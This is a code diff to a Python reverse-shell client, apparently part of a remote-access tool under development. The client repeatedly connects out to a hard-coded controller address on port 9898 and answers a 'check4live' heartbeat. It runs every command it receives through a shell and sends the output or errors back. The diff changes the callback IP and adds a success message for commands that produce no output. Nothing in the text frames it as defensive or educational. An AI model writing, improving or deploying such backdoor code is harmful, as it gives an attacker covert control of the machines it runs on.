@@ -9,7 +9,7 @@ s = socket.socket()
 
 while True:
     try:
-        s.connect(('192.168.43.188', 9898))
+        s.connect(('192.168.1.103', 9898))
         while True:
             msge = str(s.recv(1024), 'utf-8').strip()
             if msge == 'check4live':
@@ -56,7 +56,10 @@ while True:
             elif len(msge) != 0:
                 p1 = subprocess.run(msge, shell=True, capture_output=True, text=True)
                 if p1.returncode == 0:
-                    s.send(str.encode(p1.stdout))
+                    if len(p1.stdout) == 0:
+                        s.send(str.encode('Command Executed Successfully!!!'))
+                    else:
+                        s.send(str.encode(p1.stdout))
                 else:
                     s.send(str.encode('Error => ' + p1.stderr))
     except socket.error as e:
